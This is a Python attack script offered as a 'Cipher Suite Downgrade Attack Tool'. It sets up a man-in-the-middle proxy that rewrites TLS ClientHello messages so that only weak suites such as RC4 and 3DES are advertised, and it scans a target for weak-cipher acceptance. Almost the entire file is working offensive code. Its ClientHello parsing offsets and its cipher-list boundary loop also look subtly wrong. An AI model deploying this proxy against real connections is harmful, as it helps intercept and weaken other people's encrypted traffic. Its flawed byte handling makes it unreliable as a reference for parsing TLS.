#!/usr/bin/env python3
"""
cipher_downgrade.py - Cipher Suite Downgrade Attack

This script attempts to force weak cipher suites during SSL/TLS negotiation.
"""

import socket
import ssl
import struct
import threading
import argparse
import time
from scapy.all import *

class CipherDowngradeAttack:
    def __init__(self, target_host, target_port=443):
        self.target_host = target_host
        self.target_port = target_port
        self.proxy_port = 8444
        
        # Weak cipher suites to force
        self.weak_ciphers = [
            0x0004,  # TLS_RSA_WITH_RC4_128_MD5
            0x0005,  # TLS_RSA_WITH_RC4_128_SHA
            0x000A,  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
            0x0016,  # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
            0x0013,  # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
            0x0019,  # TLS_DH_anon_WITH_3DES_EDE_CBC_SHA
            0x0017,  # TLS_DH_anon_WITH_RC4_128_MD5
        ]
    
    def create_weak_client_hello(self, original_data):
        """Modify ClientHello to only advertise weak ciphers"""
        try:
            if len(original_data) < 43:
                return original_data
            
            # Parse TLS record header
            if original_data[0] != 0x16:  # Not a handshake record
                return original_data
            
            # Check if it's a ClientHello
            if len(original_data) < 6 or original_data[5] != 0x01:
                return original_data
            
            print("[ATTACK] Modifying ClientHello to advertise weak ciphers only")
            
            # Create new ClientHello with weak ciphers
            modified_data = bytearray(original_data)
            
            # Find cipher suites in ClientHello
            # Skip: record header (5) + handshake header (4) + version (2) + random (32) + session_id_length (1)
            offset = 44
            
            if offset < len(modified_data):
                session_id_length = modified_data[offset]
                offset += 1 + session_id_length
                
                if offset + 2 < len(modified_data):
                    # Cipher suites length
                    cipher_suites_length_offset = offset
                    offset += 2
                    
                    # Replace cipher suites with weak ones
                    weak_cipher_bytes = b''
                    for cipher in self.weak_ciphers:
                        weak_cipher_bytes += struct.pack('>H', cipher)
                    
                    # Update cipher suites length
                    modified_data[cipher_suites_length_offset:cipher_suites_length_offset+2] = struct.pack('>H', len(weak_cipher_bytes))
                    
                    # Replace cipher suites
                    original_cipher_end = offset
                    while original_cipher_end < len(modified_data) and modified_data[original_cipher_end:original_cipher_end+1] != b'\x01':
                        original_cipher_end += 2
                    
                    # Replace the cipher suite section
                    modified_data = modified_data[:offset] + weak_cipher_bytes + modified_data[original_cipher_end:]
                    
                    # Update record length
                    new_length = len(modified_data) - 5
                    modified_data[3:5] = struct.pack('>H', new_length)
                    
                    # Update handshake message length
                    handshake_length = len(modified_data) - 9
                    modified_data[6:9] = struct.pack('>I', handshake_length)[1:]
            
            return bytes(modified_data)
            
        except Exception as e:
            print(f"[ERROR] Failed to modify ClientHello: {e}")
            return original_data
    
    def handle_client_connection(self, client_socket):
        """Handle client connection and perform cipher downgrade"""
        try:
            # Connect to target
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.connect((self.target_host, self.target_port))
            
            print(f"[INFO] Proxying connection to {self.target_host}:{self.target_port}")
            
            def forward_data(source, destination, modify_ciphers=False):
                try:
                    while True:
                        data = source.recv(4096)
                        if not data:
                            break
                        
                        if modify_ciphers and len(data) > 5:
                            if data[0] == 0x16 and len(data) > 5 and data[5] == 0x01:  # ClientHello
                                data = self.create_weak_client_hello(data)
                        
                        destination.send(data)
                        
                except Exception as e:
                    print(f"[ERROR] Forward error: {e}")
                finally:
                    source.close()
                    destination.close()
            
            # Start forwarding
            client_to_target = threading.Thread(
                target=forward_data,
                args=(client_socket, target_socket, True)
            )
            target_to_client = threading.Thread(
                target=forward_data,
                args=(target_socket, client_socket, False)
            )
            
            client_to_target.start()
            target_to_client.start()
            
            client_to_target.join()
            target_to_client.join()
            
        except Exception as e:
            print(f"[ERROR] Connection error: {e}")
        finally:
            client_socket.close()
    
    def start_proxy(self):
        """Start cipher downgrade proxy"""
        print(f"[INFO] Starting cipher downgrade proxy on port {self.proxy_port}")
        print(f"[ATTACK] Will force weak cipher suites")
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', self.proxy_port))
        server_socket.listen(5)
        
        print(f"[INFO] Proxy listening on port {self.proxy_port}")
        
        try:
            while True:
                client_socket, addr = server_socket.accept()
                print(f"[INFO] New connection from {addr}")
                
                client_thread = threading.Thread(
                    target=self.handle_client_connection,
                    args=(client_socket,)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            print("\n[INFO] Stopping proxy...")
        finally:
            server_socket.close()
    
    def test_weak_ciphers(self):
        """Test if target accepts weak cipher suites"""
        print(f"[TEST] Testing {self.target_host} for weak cipher acceptance...")
        
        weak_cipher_names = {
            0x0004: "TLS_RSA_WITH_RC4_128_MD5",
            0x0005: "TLS_RSA_WITH_RC4_128_SHA", 
            0x000A: "TLS_RSA_WITH_3DES_EDE_CBC_SHA",
            0x0016: "TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA",
            0x0013: "TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA",
            0x0019: "TLS_DH_anon_WITH_3DES_EDE_CBC_SHA",
            0x0017: "TLS_DH_anon_WITH_RC4_128_MD5"
        }
        
        accepted_weak_ciphers = []
        
        for cipher_id in self.weak_ciphers:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # Try to set specific cipher
                try:
                    context.set_ciphers(f'@SECLEVEL=0:ALL')  # Allow weak ciphers
                    
                    sock = socket.create_connection((self.target_host, self.target_port), timeout=10)
                    ssl_sock = context.wrap_socket(sock, server_hostname=self.target_host)
                    
                    # Get negotiated cipher
                    cipher_info = ssl_sock.cipher()
                    if cipher_info:
                        cipher_name = cipher_info[0]
                        print(f"[INFO] Negotiated cipher: {cipher_name}")
                        
                        # Check if it's a weak cipher
                        if any(weak in cipher_name.upper() for weak in ['RC4', '3DES', 'DES', 'NULL', 'EXPORT']):
                            print(f"[VULNERABLE] Weak cipher accepted: {cipher_name}")
                            accepted_weak_ciphers.append(cipher_name)
                    
                    ssl_sock.close()
                    sock.close()
                    break  # Only need to test once
                    
                except Exception as e:
                    pass
                    
            except Exception as e:
                continue
        
        # Test with OpenSSL command if available
        try:
            import subprocess
            print("\n[INFO] Testing with OpenSSL for comprehensive cipher check...")
            
            # Test for weak ciphers using openssl
            weak_cipher_tests = [
                'RC4',
                '3DES', 
                'DES',
                'NULL',
                'EXPORT'
            ]
            
            for cipher_type in weak_cipher_tests:
                try:
                    result = subprocess.run([
                        'openssl', 's_client', 
                        '-connect', f'{self.target_host}:{self.target_port}',
                        '-cipher', cipher_type,
                        '-quiet'
                    ], capture_output=True, text=True, timeout=10, input='\n')
                    
                    if 'Cipher is' in result.stdout and 'NONE' not in result.stdout:
                        print(f"[VULNERABLE] {cipher_type} ciphers are supported!")
                        accepted_weak_ciphers.append(cipher_type)
                        
                except Exception:
                    pass
                    
        except Exception:
            print("[INFO] OpenSSL not available for detailed testing")
        
        if accepted_weak_ciphers:
            print(f"\n[RESULT] Target accepts weak ciphers: {', '.join(set(accepted_weak_ciphers))}")
            print("[RESULT] Target is vulnerable to cipher downgrade attacks!")
            return True
        else:
            print("\n[RESULT] Target appears to reject weak ciphers")
            return False

def main():
    parser = argparse.ArgumentParser(description='Cipher Suite Downgrade Attack Tool')
    parser.add_argument('target', help='Target hostname or IP')
    parser.add_argument('-p', '--port', type=int, default=443, help='Target port (default: 443)')
    parser.add_argument('-t', '--test', action='store_true', help='Test for vulnerability only')
    parser.add_argument('--proxy-port', type=int, default=8444, help='Proxy port (default: 8444)')
    
    args = parser.parse_args()
    
    print("Cipher Suite Downgrade Attack Tool")
    print("==================================")
    
    attacker = CipherDowngradeAttack(args.target, args.port)
    attacker.proxy_port = args.proxy_port
    
    if args.test:
        is_vulnerable = attacker.test_weak_ciphers()
        if is_vulnerable:
            print("\n[INFO] Use without --test flag to start attack proxy")
    else:
        print("[INFO] Testing for weak cipher support first...")
        is_vulnerable = attacker.test_weak_ciphers()
        
        if is_vulnerable:
            print("\n[ATTACK] Target accepts weak ciphers! Starting attack proxy...")
            time.sleep(2)
            attacker.start_proxy()
        else:
            print("\n[INFO] Target appears secure against cipher downgrades")

if __name__ == "__main__":
    main()
